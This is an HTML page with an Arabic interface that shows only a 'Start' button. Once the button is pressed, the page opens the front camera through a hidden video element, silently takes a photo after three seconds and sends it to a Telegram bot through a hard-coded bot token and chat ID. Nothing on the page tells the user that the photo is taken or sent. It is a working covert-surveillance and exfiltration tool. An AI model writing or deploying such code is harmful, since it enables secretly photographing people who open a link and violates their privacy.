<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>التقاط تلقائي</title>
</head>
<body>
  <button id="startBtn">ابدأ</button>
  <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const startBtn = document.getElementById('startBtn');
    const botToken = '70718054647964608918:AAFDyakp3Vc_ZPNbUifkhS2pwCp9fbHQsKs';
    const chatId = '7071805464';

    startBtn.onclick = async () => {
      startBtn.style.display = "none"; // إخفاء الزر بعد الضغط
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, // الكاميرا الأمامية
          audio: false
        });

        video.srcObject = stream;

        setTimeout(() => {
          captureAndSendPhoto();
        }, 3000);
      } catch (err) {
        alert("فشل الوصول إلى الكاميرا: " + err);
      }
    };

    function captureAndSendPhoto() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');

        try {
          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } catch (error) {
          alert("فشل إرسال الصورة إلى تليجرام: " + error);
        }
      }, 'image/jpeg');
    }
  </script>
</body>
</html>
